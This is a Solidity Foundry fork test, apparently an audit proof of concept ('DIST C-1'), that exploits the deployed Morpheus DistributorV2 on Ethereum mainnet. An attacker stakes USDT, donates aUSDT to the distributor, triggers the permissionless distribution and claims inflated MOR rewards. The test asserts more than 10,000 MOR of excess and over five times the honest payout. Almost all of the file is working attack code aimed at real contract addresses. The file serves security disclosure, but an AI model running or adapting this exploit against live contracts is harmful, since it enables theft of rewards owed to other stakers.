// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

/// @notice Minimal interfaces for the REAL deployed Morpheus capital-protocol contracts.
interface IERC20Min {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IDistributorMin {
    function distributeRewards(uint256 rewardPoolIndex_) external;
    function getDistributedRewards(uint256, address) external view returns (uint256);
    function depositPools(uint256, address)
        external
        view
        returns (
            address token,
            string memory chainLinkPath,
            uint256 tokenPrice,
            uint256 deposited,
            uint256 lastUnderlyingBalance,
            uint8 strategy,
            address aToken,
            bool isExist
        );
}

interface IDepositPoolMin {
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    function claim(uint256 rewardPoolIndex_, address receiver_) external payable;
    function getLatestUserReward(uint256 rewardPoolIndex_, address user_) external view returns (uint256);
}

interface IAavePoolMin {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
}

interface IChainLinkConsumerMin {
    function getPathId(string memory path_) external pure returns (bytes32);
    function dataFeeds(bytes32 pathId_, uint256 index_) external view returns (address);
}

interface IAggregatorMin {
    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80);
}

/// @title DIST C-1 fork PoC: donation-steered MOR emission split in DistributorV2.distributeRewards
/// @dev Fork: Ethereum mainnet @ block 26232694.
///      Attacker is a FRESH unprivileged address. The ONLY setup cheats are funding the
///      attacker (deal() for USDT + ETH) — every protocol interaction is the attacker's own
///      call: DepositPool.stake, Aave supply, plain ERC20 transfer (the donation),
///      Distributor.distributeRewards (permissionless), DepositPool.claim.
contract DistDonationPoC is Test {
    address internal constant DIST = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A; // DistributorV2 proxy
    address internal constant USDT_POOL = 0x3B51989212BEdaB926794D6bf8e9E991218cf116; // DepositPool (USDT) proxy
    address internal constant MOR = 0xcBB8f1BDA10b9696c57E13BC128Fe674769DCEc0;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant AAVE_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address internal constant CLC = 0xd182263d06FDC463c96190005D6359CC3d3Bbc5e; // ChainLinkDataConsumer proxy
    uint256 internal constant FORK_BLOCK = 26232694;
    uint256 internal constant STAKE = 47_390e6; // 47,390 USDT -> ~91% of the tiny USDT pool
    uint256 internal constant DONATE = 5_197e6; // 5,197 USDT -> aUSDT donation (audit's worked example)
    uint256 internal constant WARP_SECONDS = 15 days; // clears claimLockPeriodAfterStake (14d) and min period (1d)
    uint256 internal constant CLAIM_VALUE = 1 ether; // LayerZero fee budget for the claim mint message (excess refunded)

    bytes32 internal constant USER_CLAIMED_SIG = keccak256("UserClaimed(uint256,address,address,uint256)");
    bytes32 internal constant MINT_SENT_SIG = keccak256("MintMessageSent(address,uint256)");

    address internal attacker;
    address internal aUSDT;

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
        attacker = makeAddr("attacker");
        (,,,,,, aUSDT,) = IDistributorMin(DIST).depositPools(0, USDT_POOL);
        require(aUSDT == 0x23878914EFE38d27C4D67Ab83ed1b93A74D4086a, "unexpected aToken");

        // ---- documented setup cheat: fund the fresh attacker ----
        deal(USDT, attacker, 200_000e6);
        vm.deal(attacker, 100 ether);
        require(IERC20Min(USDT).balanceOf(attacker) >= STAKE + DONATE, "USDT deal failed");
    }

    /// USDT (Tether) approve() returns NO bool -> must use a raw call, returndata ignored.
    function _approveUSDT(address spender_, uint256 amount_) internal {
        (bool ok_, ) = USDT.call(abi.encodeWithSignature("approve(address,uint256)", spender_, amount_));
        require(ok_, "USDT approve call failed");
    }

    /// FORK-ENVIRONMENT SIMULATION (documented, read carefully):
    /// A mainnet fork freezes every Chainlink round at the fork block. Morpheus's consumer
    /// rejects answers older than allowedPriceUpdateDelay (3600s for stETH/wETH feeds,
    /// 86400s for the rest), while distributeRewards() needs > 86400s between distributions
    /// and DepositPool.claim needs a 14-day lock to elapse. A >1h warp therefore makes the
    /// REAL system unreachable on a plain fork — on live mainnet the feeds simply keep
    /// updating. To simulate that passage of live oracle time we mock ONLY the third-party
    /// Chainlink aggregators' latestRoundData(): each feed returns its REAL fork-block
    /// answer (price unchanged) with updatedAt = current block.timestamp. No Morpheus
    /// contract, storage, config or price is altered; the consumer's own staleness/zero
    /// checks still execute against these rounds.
    function _simulateLiveOracle() internal {
        string[5] memory paths = ["stETH/USD", "wETH/USD", "wBTC/BTC,BTC/USD", "USDC/USD", "USDT/USD"];
        for (uint256 p = 0; p < paths.length; p++) {
            bytes32 pid_ = IChainLinkConsumerMin(CLC).getPathId(paths[p]);
            for (uint256 i = 0; i < 4; i++) {
                address feed_;
                try IChainLinkConsumerMin(CLC).dataFeeds(pid_, i) returns (address f_) {
                    feed_ = f_;
                } catch {
                    break;
                }
                (uint80 rid_, int256 ans_, , , ) = IAggregatorMin(feed_).latestRoundData();
                require(ans_ > 0, "non-positive real feed answer");
                vm.mockCall(
                    feed_,
                    abi.encodeWithSignature("latestRoundData()"),
                    abi.encode(rid_, ans_, block.timestamp, block.timestamp, rid_)
                );
            }
        }
    }

    /// Attacker's own stake into the USDT DepositPool (real protocol interaction).
    /// Distributor.supply pulls USDT from the holder via transferFrom, so approval goes to DIST.
    function _stake() internal {
        vm.startPrank(attacker);
        _approveUSDT(DIST, STAKE);
        IDepositPoolMin(USDT_POOL).stake(0, STAKE, 0, address(0));
        vm.stopPrank();
    }

    /// Attacker obtains aUSDT by supplying USDT to Aave directly (permissionless),
    /// then donates it to the Distributor with a plain ERC20 transfer.
    function _donate() internal returns (uint256 aAmount_) {
        vm.startPrank(attacker);
        _approveUSDT(AAVE_POOL, DONATE);
        IAavePoolMin(AAVE_POOL).supply(USDT, DONATE, attacker, 0);
        aAmount_ = IERC20Min(aUSDT).balanceOf(attacker);
        require(aAmount_ > 0, "no aUSDT received");
        IERC20Min(aUSDT).transfer(DIST, aAmount_);
        vm.stopPrank();
    }

    /// Attacker triggers the distribution themselves (tests the permissionless gate)
    /// and returns the USDT pool's credit delta for this distribution.
    function _distributeAsAttacker() internal returns (uint256 poolCreditDelta_) {
        uint256 before_ = IDistributorMin(DIST).getDistributedRewards(0, USDT_POOL);
        vm.prank(attacker);
        IDistributorMin(DIST).distributeRewards(0); // reverts here if gated -> test fails, gate identified by trace
        poolCreditDelta_ = IDistributorMin(DIST).getDistributedRewards(0, USDT_POOL) - before_;
    }

    /// Attacker claims via DepositPool.claim; parses the UserClaimed event amount.
    function _claim() internal returns (uint256 claimed_, bool ok_) {
        vm.recordLogs();
        vm.prank(attacker);
        (ok_, ) = USDT_POOL.call{value: CLAIM_VALUE}(
            abi.encodeWithSelector(IDepositPoolMin.claim.selector, 0, attacker)
        );
        if (!ok_) return (0, false);
        Vm.Log[] memory logs_ = vm.getRecordedLogs();
        for (uint256 i = 0; i < logs_.length; i++) {
            if (logs_[i].topics.length > 0 && logs_[i].topics[0] == USER_CLAIMED_SIG && logs_[i].emitter == USDT_POOL) {
                (, claimed_) = abi.decode(logs_[i].data, (address, uint256));
            }
        }
    }

    function test_DonationSteersEmission() public {
        (,,, uint256 poolDeposited0,,,,) = _poolState();
        emit log_named_uint("USDT pool deposited BEFORE attacker stake (6dp)", poolDeposited0);
        emit log_named_uint("fork block timestamp", block.timestamp);

        // ================= CONTROL RUN (honest: stake, no donation) =================
        uint256 snap = vm.snapshotState();
        _stake();
        vm.warp(block.timestamp + WARP_SECONDS);
        _simulateLiveOracle();
        uint256 controlPoolCredit = _distributeAsAttacker();
        uint256 claimableControl = IDepositPoolMin(USDT_POOL).getLatestUserReward(0, attacker);
        (uint256 claimedControl, bool claimOkControl) = _claim();
        uint256 claimableAfterControl = IDepositPoolMin(USDT_POOL).getLatestUserReward(0, attacker);
        emit log_named_uint("CONTROL pool credit delta from distribution (MOR 18dp)", controlPoolCredit);
        emit log_named_uint("CONTROL attacker claimable MOR", claimableControl);
        emit log_named_uint("CONTROL attacker claimed via UserClaimed event", claimedControl);
        emit log_named_string("CONTROL claim tx ok", claimOkControl ? "yes" : "NO");
        emit log_named_uint("CONTROL claimable after claim", claimableAfterControl);
        require(claimOkControl, "control claim failed - environment problem, not a refutation");
        require(claimedControl > 0, "control claimed zero");
        vm.clearMockedCalls();

        vm.revertToState(snap);

        // ================= ATTACK RUN (stake + aUSDT donation) =================
        _stake();
        uint256 distABalBefore = IERC20Min(aUSDT).balanceOf(DIST);
        uint256 donated = _donate();
        uint256 distABalAfter = IERC20Min(aUSDT).balanceOf(DIST);
        emit log_named_uint("ATTACK aUSDT donated to Distributor (6dp)", donated);
        assertEq(distABalAfter - distABalBefore, donated, "donation did not land on Distributor");

        vm.warp(block.timestamp + WARP_SECONDS);
        _simulateLiveOracle();
        uint256 attackPoolCredit = _distributeAsAttacker();
        uint256 claimableAttack = IDepositPoolMin(USDT_POOL).getLatestUserReward(0, attacker);
        (uint256 claimedAttack, bool claimOkAttack) = _claim();
        uint256 claimableAfterAttack = IDepositPoolMin(USDT_POOL).getLatestUserReward(0, attacker);
        emit log_named_uint("ATTACK pool credit delta from distribution (MOR 18dp)", attackPoolCredit);
        emit log_named_uint("ATTACK attacker claimable MOR", claimableAttack);
        emit log_named_uint("ATTACK attacker claimed via UserClaimed event", claimedAttack);
        emit log_named_string("ATTACK claim tx ok", claimOkAttack ? "yes" : "NO");
        emit log_named_uint("ATTACK claimable after claim", claimableAfterAttack);
        require(claimOkAttack, "attack claim failed");

        // ================= ASSERTIONS: the excess =================
        uint256 excess = claimableAttack - claimableControl;
        emit log_named_uint("EXCESS MOR claimable (attack - control)", excess);
        emit log_named_uint("ratio x1000 (attack/control)", (claimableAttack * 1000) / claimableControl);

        assertGt(attackPoolCredit, controlPoolCredit, "pool credit not steered by donation");
        assertGt(claimableAttack, claimableControl, "attacker claimable not increased by donation");
        assertGt(excess, 10_000e18, "excess MOR not material (<10k MOR)");
        assertGt((claimableAttack * 1000) / claimableControl, 5000, "attack/control ratio below 5x");
        assertGt(claimedAttack, claimedControl, "claimed amount not increased");
        assertEq(claimableAfterAttack, 0, "attack claimable not zeroed after claim");
        assertEq(claimableAfterControl, 0, "control claimable not zeroed after claim");
    }

    function _poolState() internal view returns (address, string memory, uint256, uint256, uint256, uint8, address, bool) {
        return IDistributorMin(DIST).depositPools(0, USDT_POOL);
    }
}
